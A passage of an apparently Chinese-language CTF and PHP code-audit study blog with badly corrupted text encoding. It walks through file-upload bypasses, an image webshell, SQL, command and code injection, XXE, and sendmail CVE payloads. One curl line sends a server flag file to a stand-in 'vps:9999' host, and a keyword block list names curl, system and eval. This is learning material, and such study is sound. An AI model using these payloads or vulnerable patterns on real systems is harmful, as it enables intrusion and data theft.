$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125; &#125; æœ¬é¢˜ä¸ä¹‹å‰çš„é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é¢˜çš„æ–‡ä»¶çš„ä¿å­˜è·¯å¾„æ˜¯å¯ä»¥æ§åˆ¶çš„ è¿™é‡Œç”¨çš„%00æˆªæ–­ï¼ŒåŸç†å¦‚ä¸‹ www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.phpå…¶åç¼€åä¸º.jpgå¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä½†æ˜¯windowsç³»ç»Ÿå¤„ç†æ—¶ä¸ä¼šå¤„ç†%00ä¹‹åçš„å†…å®¹æ•…ä¿å­˜çš„æ–‡ä»¶å°±æ˜¯qq.php pass13è¿™é¢˜ä¸ä¸Šé¢˜åˆ©ç”¨çš„åŸç†ç›¸åŒ ä½†æ˜¯è¿™é‡Œè¦ä½¿ç”¨ 00çš„äºŒè¿›åˆ¶å½¢å¼ pass14æ˜ç¡®è¯´äº†ä¸Šä¼ å›¾ç‰‡æœ¨é©¬ function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType; &#125; GIF89a æ˜¯GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´ ï¼Œæ˜¯ä¸ºäº†ç»•è¿‡gifæ–‡ä»¶çš„æ£€æŸ¥ å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ æ¡Œé¢å»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å°†å…¶æ”¹ä¸º2.jpgï¼Œå†å»ºç«‹ä¸€ä¸ªæ”¹ä¸º1.php,å…¶å†…å®¹ä¸ºä½ æƒ³æ·»åŠ çš„ä¸€å¥è¯æœ¨é©¬ copy 2.jpg /b + 1.php /a webshell.jpg ä»£ç å®¡è®¡1.in_array//1.php &lt;?php include &#x27;config.php&#x27;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot;); &#125; $sql = &quot;SELECT COUNT(*) FROM users&quot;; $whitelist = array(); $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row[&#x27;COUNT(*)&#x27;]); &#125; $id = stop_hack($_GET[&#x27;id&#x27;]); $sql = &quot;SELECT * FROM users WHERE id=$id&quot;; if (!in_array($id, $whitelist)) &#123; die(&quot;id $id is not in whitelist.&quot;); &#125; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;; foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;; &#125; else&#123; die($conn-&gt;error); &#125; ?&gt; æ¼æ´è§£æ ï¼š è¿™ä¸€å…³å¡è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œè€Œå¯¼è‡´è¿™ä¸€æ¼æ´çš„å‘ç”Ÿåˆ™æ˜¯ä¸å®‰å…¨çš„ä½¿ç”¨ in_array() å‡½æ•°æ¥æ£€æµ‹ä¸Šä¼ çš„æ–‡ä»¶åï¼Œå³ä¸Šå›¾ä¸­çš„ç¬¬12è¡Œéƒ¨åˆ†ã€‚ç”±äºè¯¥å‡½æ•°å¹¶æœªå°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true ï¼Œè¿™å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ çš„æ–‡ä»¶åæ¥ç»•è¿‡æœåŠ¡ç«¯çš„æ£€æµ‹ï¼Œä¾‹å¦‚æ–‡ä»¶åä¸º 7shell.php ã€‚å› ä¸ºPHPåœ¨ä½¿ç”¨ in_array() å‡½æ•°åˆ¤æ–­æ—¶ï¼Œä¼šå°† 7shell.php å¼ºåˆ¶è½¬æ¢æˆæ•°å­—7ï¼Œè€Œæ•°å­—7åœ¨ range(1,24) æ•°ç»„ä¸­ï¼Œæœ€ç»ˆç»•è¿‡ in_array() å‡½æ•°åˆ¤æ–­ï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ in_array() æ¼æ´åˆ©ç”¨çš„ä¾‹é¢˜å¦‚ä¸‹ //index.php &lt;?php include &#x27;config.php&#x27;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot;); &#125; $sql = &quot;SELECT COUNT(*) FROM users&quot;; $whitelist = array(); $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row[&#x27;COUNT(*)&#x27;]); &#125; $id = stop_hack($_GET[&#x27;id&#x27;]); $sql = &quot;SELECT * FROM users WHERE id=$id&quot;; if (!in_array($id, $whitelist)) &#123; die(&quot;id $id is not in whitelist.&quot;); &#125; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;; foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;; &#125; else&#123; die($conn-&gt;error); &#125; ?&gt; //config.php &lt;?php $servername = &quot;localhost&quot;; $username = &quot;fire&quot;; $password = &quot;fire&quot;; $dbname = &quot;day1&quot;; function stop_hack($value)&#123; $pattern = &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;; $back_list = explode(&quot;|&quot;,$pattern); foreach($back_list as $hack)&#123; if(preg_match(&quot;/$hack/i&quot;, $value)) die(&quot;$hack detected!&quot;); &#125; return $value; &#125; ?&gt; å¯ä»¥çœ‹åˆ°ç½‘é¡µçš„åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯è¾“å…¥ç”¨æˆ·idï¼Œç„¶åæœåŠ¡å™¨è¿”å›ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¯¹idå‚æ•°ä½¿ç”¨in_array()å‡½æ•°è¿›è¡Œäº†æ£€æŸ¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šé¢æåˆ°çš„æ¼æ´ï¼Œåªè¦payloadçš„ç¬¬ä¸€ä¸ªå­—ç¬¦åœ¨range(1,count(*))çš„èŒƒå›´ä¹‹å†…å³å¯ç»•è¿‡ç¬¬æ£€æŸ¥ã€‚ç»•è¿‡æ•ˆæœå¦‚ä¸‹ ä½†æ˜¯æœ‰ä¸€ä¸ªstop_hackå‡½æ•°ï¼Œå…¶è¿‡æ»¤äº†å¾ˆå¤šsqlæ³¨å…¥ä¸­å¸¸ç”¨çš„å…³é”®è¯ï¼Œå¯¼è‡´äº†å¾ˆå¤šæ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œå…¶ä¸­orè¢«è¿‡æ»¤å°±å¾ˆéº»çƒ¦ï¼Œinformation_schemaä¸­åŒ…å«orå•è¯ï¼Œæ‰€ä»¥å¸¸è§„çš„æ³¨å…¥æ–¹æ³•æ— æ³•ä½¿ç”¨ã€‚ è¿™é‡Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä½¿ç”¨ make_set()å‡½æ•°å®ç°æŠ¥é”™æ³¨å…¥ã€‚ ?id=1 and updatexml(1,make_set(7,0x7e,(select user()),0x7e),1) è¡¨åï¼Œåˆ—åæ— æ³•ä½¿ç”¨information_shcemaï¼Œä½†æ˜¯å¦‚æœæ˜¯ä¸ºäº†è·å–flagçš„è¯ï¼Œå¯ä»¥çŒœæµ‹æ˜¯åœ¨flagè¡¨çš„flagåˆ— æœ€åè·å–flagçš„payload ?id=1 and updatexml(1,make_set(7,0x7e,(select flag from flag),0x7e),1) 2.filter_varå‡½æ•°ç¼ºé™·&lt;?php $url = $_GET[&#x27;url&#x27;]; if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match(&#x27;/sec-redclub.com$/&#x27;,$site_info[&#x27;host&#x27;]))&#123; exec(&#x27;curl &quot;&#x27;.$site_info[&#x27;host&#x27;].&#x27;&quot;&#x27;, $result); echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&#x27;host&#x27;]&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;; echo implode(&#x27; &#x27;, $result); &#125; else&#123; die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;); &#125; &#125; else&#123; echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;; &#125; ?&gt; filter_var ä»£ç å®¡è®¡ è¾“å…¥çš„ç½‘å€é¦–å…ˆç»è¿‡ filter_var()åˆ¤æ–­æ˜¯å¦ç¬¦åˆ uri æ ¼å¼è¦æ±‚ï¼Œç„¶åç”¨ parse_url() æå–å‡ºå…¶ä¸­çš„ host éƒ¨åˆ†ï¼Œæ‹¼æ¥åˆ° exec()å‡½æ•°é‡Œï¼Œè€Œ url æ˜¯å¯æ§çš„ï¼Œæ˜æ˜¾æ€è·¯æ˜¯è¦åˆ©ç”¨ exec()æ¥å‘½ä»¤æ‰§è¡Œã€‚ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ payload è¿›å…¥å‘½ä»¤æ‰§è¡Œï¼Œå¼•å·ç”¨æ¥é—­åˆ curl åé¢çš„å¼•å·ï¼Œåˆ†å·åˆ™ç”¨æ¥é—­ åˆå‘½ä»¤ï¼Œä»è€Œæ‰§è¡Œ ls å‘½ä»¤ï¼Œå¹¶ä¸”ç”±äº parse_url()çš„è§£æé—®é¢˜ï¼Œä¼šæŠŠç¬¬ä¸€ä¸ªåˆ†å·åé¢çš„ å†…å®¹å½“ä½œ host éƒ¨åˆ†ï¼Œåˆ™ç»•è¿‡äº†æ­£åˆ™åŒ¹é…æ£€æŸ¥ã€‚ ?url=hello://&quot;;ls;&quot;sec-redclub.com æ­¤æ—¶çš„$site_info[host]çš„å€¼ä¸º&quot;;dir;&quot;sec-redclub.comï¼Œé‚£ä¹ˆæ‹¼æ¥åçš„è¯­å¥ ä¸º curl &quot;&quot;;dir;&quot;sec-redclub.com&quot; è¿™æ ·å½“execæ‰§è¡Œæ—¶å°±ä¼šæ‰§è¡Œåˆ°dirå‘½ä»¤ï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ—å‡ºç›®å½• è¯»å–flag ?url=hello://&quot;;more$&#123;IFS&#125;;&quot;sec-redclub.com 3.å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´&lt;?php class NotFound&#123; function __construct() &#123; die(&#x27;404&#x27;); &#125; &#125; spl_autoload_register( function ($class)&#123; new NotFound(); &#125; ); $classname = isset($_GET[&#x27;name&#x27;]) ? $_GET[&#x27;name&#x27;] : null; $param = isset($_GET[&#x27;param&#x27;]) ? $_GET[&#x27;param&#x27;] : null; $param2 = isset($_GET[&#x27;param2&#x27;]) ? $_GET[&#x27;param2&#x27;] : null; if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;; &#125; è¿™é“é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯å®ä¾‹åŒ–æ¼æ´ç»“åˆXXEæ¼æ´ã€‚æˆ‘ä»¬åœ¨ä¸Šå›¾ç¬¬18è¡Œå¤„å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† class_exists å‡½æ•°æ¥åˆ¤æ–­ç±»æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šè°ƒç”¨ç¨‹åºä¸­çš„ __autoload å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ __autoload å‡½æ•°ï¼Œè€Œæ˜¯ç”¨ spl_autoload_register æ³¨å†Œäº†ä¸€ä¸ªç±»ä¼¼ __autoload ä½œç”¨çš„å‡½æ•°ï¼Œå³è¿™é‡Œè¾“å‡º404ä¿¡æ¯ã€‚ æˆ‘ä»¬è¿™é‡Œç›´æ¥åˆ©ç”¨PHPçš„å†…ç½®ç±»ï¼Œå…ˆç”¨ GlobIterator ç±»æœç´¢ flagæ–‡ä»¶ åå­—ï¼Œæ¥çœ‹ä¸€ä¸‹PHPæ‰‹å†Œå¯¹ GlobIterator ç±»çš„ æ„é€ å‡½æ•°çš„å®šä¹‰ï¼š public GlobIterator::__construct ( string $pattern [, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] ) é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ flag åœ¨å“ªä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ PHP çš„å†…ç½®ç±»ä¸­å¯ä»¥ç”¨ GlobIterator ç±»æ¥éå†æ–‡ä»¶ç³»ç»Ÿï¼Œå…¶æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æœç´¢çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé€‰æ‹©æ–‡ä»¶çš„å“ªä¸ª åˆ—ç›®å½•çš„payload: http://127.0.0.1/homework/php/xxe/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0 è¯»å–flag æ–¹æ³•ä¸€ï¼š å®ä¾‹åŒ– SimpleXMLElementç±»æ¥è¿›è¡Œ XXE ?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/f1ag.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2 æ–¹æ³•äºŒ: ä½¿ç”¨ SplFileObject ç±»ç›´æ¥è¯»å–æ–‡ä»¶ payload ?name=SplFileObject&amp;param=./flag.php&amp;param2=r 4.escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“ä¸»ä½“ä¸Šå°±æ˜¯ä¸€ä¸ªè¿‡æ»¤äº†åçš„mailå‡½æ•°æ‰§è¡Œã€‚mailå‡½æ•°çš„å‚æ•°æ˜¯è¿™æ ·çš„ bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] ) ç”±äºé»˜è®¤è°ƒç”¨çš„æ˜¯linuxçš„sendmailå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥åœ¨messageä¸­å†™å…¥æ¶æ„ä»£ç ã€‚æ¥ç€ç”±additional_parameters æŒ‡å®šé¢å¤–å‚æ•°ï¼Œä»è€Œå†™å…¥åœ¨æŒ‡å®šç›®å½•å†™å…¥æ–‡ä»¶ã€‚ ä½†æ˜¯ï¼Œphpçš„mailå‡½æ•°ä¹Ÿåœ¨åº•å±‚é»˜è®¤æ‰§è¡Œäº†ä¸€å±‚escapeshellcmd()å‡½æ•°ï¼Œé‚£ä¹ˆæ˜¾ç„¶è½¬ä¹‰äº†æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚ä¸è¿‡ï¼Œæœ¬é¢˜ä»£ç è¿˜æœ‰ä¸€å¤„ç»å…¸çš„escapeshellarg()ã€‚å¦‚æœescapeshellarg()+escapeshellcmd()æ­é…ä½¿ç”¨ï¼Œå°†å‡ºç°ç‰¹æ®Šå­—ç¬¦é€ƒé€¸çš„é—®é¢˜ã€‚buuä¸Šä¹Ÿæœ‰ä¸€ä¸ªç±»ä¼¼çš„é¢˜ç›®.è¿™é‡Œåˆ™å€Ÿç”¨é¡¹ç›®é‡Œçš„ä¾‹å­ç®€å•ä»‹ç»ä¸‹ 127.0.0.1&#x27; -v -d a=1 #escapeshellarg &#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1&#x27; #escapeshellcmd &#x27;127.0.0.1&#x27;\\\\&#x27;&#x27; -v -d a=1\\&#x27; æ­¤æ—¶æœ€åä¸€æ­¥å¯ä»¥çœ‹å‡ºï¼Œ\\\\å°†è¢«è§£é‡Šä¸º\\ä¸å†èµ·åˆ°è½¬ä¹‰çš„ä½œç”¨ï¼Œè€Œæ˜¯ä½œä¸ºæ¢è¡Œç¬¦ã€‚å› æ­¤payloadå˜ä¸ºå…ˆæ˜¯127.0.0.1ï¼Œå†-v -d-då¯¹åº”çš„æ•°æ®ä¸ºa=1&#39;. æ¯”å¦‚CVE-2016-10033 è·ŸCVE-2016-10045çš„ä¸¤ä¸ªpayload a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com å‰è€…æ²¡æœ‰escapeshellcmdç›´æ¥æ‰“ã€‚åè€…escapeshellcmdååˆåŠ äº†ä¸€å±‚escapeshellargå¯¼è‡´å­—ç¬¦é€ƒé€¸ã€‚ æºç å¦‚ä¸‹ï¼Œå¯¹å…¶è¿›è¡Œäº†æ³¨é‡Š &lt;?php highlight_file(&#39;index.php&#39;); function waf($a)&#123; foreach($a as $key &#x3D;&gt; $value)&#123; if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;&#x2F;&#x2F;éå†æ‰€æœ‰é”®ï¼Œä¸èƒ½å‡ºç°flagå­—æ · exit(&#39;are you a hacker&#39;); &#125; &#125; &#125; foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;&#x2F;&#x2F;éå†æ‰€æœ‰ä»¥postï¼Œgetï¼Œcookieæ–¹å¼æäº¤çš„æ•°æ®ï¼Œ if($$__R) &#123; &#x2F;&#x2F;ä¾‹å¦‚$flag&#x3D;a,$$flag--&gt;$a,ä¸€ä¸ªæ–°å˜é‡ foreach($$__R as $__k &#x3D;&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); &#x2F;&#x2F;è‹¥ä¹‹å‰æœ‰è¿™ä¸ªå˜é‡å¹¶ä¸”é”®å’Œå€¼ç›¸ç­‰ï¼Œå°±åˆ é™¤è¿™ä¸ªå˜é‡ &#125; &#125; &#125; if($_POST) &#123; waf($_POST);&#125; if($_GET) &#123; waf($_GET); &#125; if($_COOKIE) &#123; waf($_COOKIE);&#125; if($_POST) extract($_POST, EXTR_SKIP);&#x2F;&#x2F;å°†é”®åå˜æˆå˜é‡åï¼Œå¦‚æœä¼ å…¥flagï¼Œåº”è¯¥æ˜¯è®¾ç½®äº†_GET[&#39;flag&#39;]è¿™ä¸ªå˜é‡ if($_GET) extract($_GET, EXTR_SKIP); if(isset($_GET[&#39;flag&#39;]))&#123;&#x2F;&#x2F;å¿…é¡»è®¾ç½®ä»¥getæ–¹å¼ä¼ å‚çš„flag..è¿™ä¸ªå¯ä»¥ç”¨ if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123; exit(&#39;error&#39;); &#125; if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;&#x2F;&#x2F;æ•°ç»„æˆ–ç¢°æ’ echo &quot;success!&quot;; $url &#x3D; $_GET[&#39;url&#39;]; $urlInfo &#x3D; parse_url($url); if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123; die( &quot;scheme error!&quot;); &#125; $url &#x3D; escapeshellarg($url); $url &#x3D; escapeshellcmd($url);&#x2F;&#x2F;ç‰¹æ®Šå­—ç¬¦é€ƒé€¸ system(&quot;curl &quot;.$url); &#125; &#125; ?&gt; å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–ï¼Œä¹‹åè¦ç»•è¿‡wafã€‚å†æ¥ä¸‹æ¥å°±æ˜¯escapeshellsmd/argçš„æ­é…è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚é¦–å…ˆè¦è§£å†³çš„æ˜¯ï¼Œæˆ‘ä»¬å¿…é¡»ç»•è¿‡preg_matchçš„é™åˆ¶æ‰èƒ½ä¼ å…¥flagå˜é‡ã€‚å› æ­¤è¦åˆ©ç”¨å¥½å®ƒå†™å¥½çš„è¿™ä¸ªåŠŸèƒ½ã€‚ é¦–å…ˆè¿™é‡Œåˆ©ç”¨äº†å¯å˜å˜é‡çš„ç‰¹æ€§ã€‚å‡è®¾æˆ‘ä»¬æäº¤ ?flag=test post:_GET[flag]=test å½“å¼€å§‹éå† $_POST è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ $__k ä»£è¡¨ _GET[flag] ï¼Œæ‰€ä»¥ $$__kå°±æ˜¯ $_GET[flag] ï¼Œå³ test å€¼ï¼Œæ­¤æ—¶ $$__k == $__v æˆç«‹ï¼Œå˜é‡ $_GET[flag] å°±è¢« unset äº† è€Œæ¥ä¸‹æ¥ä¸‹é¢åˆæœ‰ä¸€ä¸ªå˜é‡è¦†ç›–if($_POST) extract($_POST, EXTR_SKIP);æ‰€ä»¥ç›´æ¥å¾—åˆ°$_GET[flag]=testç»•è¿‡ç¬¬ä¸€å±‚ ç¬¬äºŒå±‚åªéœ€åˆ©ç”¨0eçš„MD5å¼±ç±»å‹æ¯”è¾ƒæœ€åæ˜¯curlçš„å‘½ä»¤æ‰§è¡Œhttp://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999ä¼¼ä¹å½“curlç‰ˆæœ¬å˜é«˜åï¼Œå°†ä¸å†èƒ½æ‰§è¡Œã€‚curl &#39;127.0.0.1&#39;\\&#39;&#39; 5.preg_matchå‡½æ•°æ¼æ´// index.php &lt;?php include &#x27;flag.php&#x27;; if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123; $password = $_POST[&#x27;password&#x27;]; if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) &#123; echo &#x27;Wrong Format&#x27;; exit; &#125; while (TRUE) &#123; $reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;); foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3) break; if (&quot;42&quot; == $password) echo $flag; else echo &#x27;Wrong password&#x27;; exit; &#125; &#125; highlight_file(__FILE__); ?&gt; å­—ç¬¦ç±»çš„å«ä¹‰æ˜¯ graph ç©ºæ ¼ä»¥å¤–çš„å¯æ‰“å°å­—ç¬¦ punct æ‰“å°å­—ç¬¦ï¼Œä¸åŒ…æ‹¬å­—æ¯æ•°å­— ä¸»è¦å‡½æ•°é‡Œï¼Œç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨ç¤ºåŒ¹é…åˆ°å¯æ‰“å°å­—ç¬¦12ä¸ªä»¥ä¸Š;ç¬¬äºŒä¸ªæ­£åˆ™è¡¨ç¤ºæŠŠè¿ç»­çš„ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ï¼Œä½œä¸ºä¸€æ®µï¼Œè‡³å°‘åˆ†å…­æ®µ;ç¬¬ä¸‰ä¸ªæ­£åˆ™è¡¨ç¤ºè¾“å…¥çš„å­—ç¬¦ä¸²è‡³å°‘å«æœ‰ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ä¸­çš„ä¸‰ç§ç±»å‹ã€‚ æœ€åä¸æ•°å­—è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒã€‚payload 42.00e+00000 ç¬¬ä¸€ç§æ–¹æ³• http://127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();// http://127.0.0.1/index.php?option=a ç¬¬ä¸€ä¸ªpayloadå†™å…¥å†…å®¹ååªæœ‰ä¸€ä¸ªå•å¼•å·è¢«è½¬ä¹‰çš„é—®é¢˜ã€‚è€Œç¬¬äºŒéƒ¨åˆ†å†ä¼ å…¥ä¸€ä¸ªaæ—¶å°±ä¼šå› ä¸º.*åŒ¹é…æ— æ•°æ¬¡è€ŒæŠŠ\\æ¢æ‰ è¿˜æœ‰ä¸¤ç§preg_replaceçš„æ–¹æ³•ã€è¿™é‡Œæä¸‹ç¬¬äºŒç§ï¼Œä¹Ÿå°±æ˜¯è¿˜é€‚ç”¨äºå•è¡Œ(éè´ªå©ª)æ¨¡å¼çš„payloadã€‚ä¹‹å‰å®‰æ’çš„å¥—å¨ƒweb2é‡Œå‡ºç°è¿‡ã€‚ http://127.0.0.1/test/ph.php?option=;phpinfo(); http://127.0.0.1/test/ph.php?option=$0 å…¶æœ€åçš„æ•ˆæœæ˜¯ä¸‹é¢è¿™æ ·çš„ &lt;?php $option=&#x27;$option=&#x27;;phpinfo();&#x27;;&#x27;; 6.parse_strå‡½æ•°ç¼ºé™·æ¼æ´ä»£ç  function getUser($id) &#123; global $config, $db; if (!is_resource($db)) &#123; $db = new MySQLi( $config[&#x27;dbhost&#x27;], $config[&#x27;dbuser&#x27;], $config[&#x27;dbpass&#x27;], $config[&#x27;dbname&#x27;] ); &#125; $sql = &quot;SELECT username FROM users WHERE id = ?&quot;; $stmt = $db-&gt;prepare($sql); $stmt-&gt;bind_param(&#x27;i&#x27;, $id); $stmt-&gt;bind_result($name); $stmt-&gt;execute(); $stmt-&gt;fetch(); return $name; &#125; $var = parse_url($_SERVER[&#x27;HTTP_REFERER&#x27;]); parse_str($var[&#x27;query&#x27;]); $currentUser = getUser($id); echo &#x27;&lt;h1&gt;&#x27;.htmlspecialchars($currentUser).&#x27;&lt;/h1&gt;&#x27;; æ¼æ´è§£æ parse_str å…ˆæ¥çœ‹çœ‹å®šä¹‰ï¼š parse_stråŠŸèƒ½ ï¼šparse_strçš„ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶ä¸”æ³¨å†Œæˆå˜é‡ï¼Œå®ƒåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¦†ç›–æ‰å½“å‰ä½œç”¨åŸŸä¸­åŸæœ‰çš„å˜é‡ã€‚ å®šä¹‰ ï¼švoid parse_str( string $encoded_string [, array &amp;$result ] ) å¦‚æœ encoded_string æ˜¯ URL ä¼ å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† result åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ çœ‹äº†å®šä¹‰æˆ‘ä»¬ä¹Ÿèƒ½å¾ˆå¿«æ„Ÿå—åˆ°å®ƒçš„æ¼æ´ç‚¹å°±æ˜¯å˜é‡è¦†ç›–äº†ã€‚ PHP $_SERVER[â€˜HTTP_REFERERâ€™] PHP 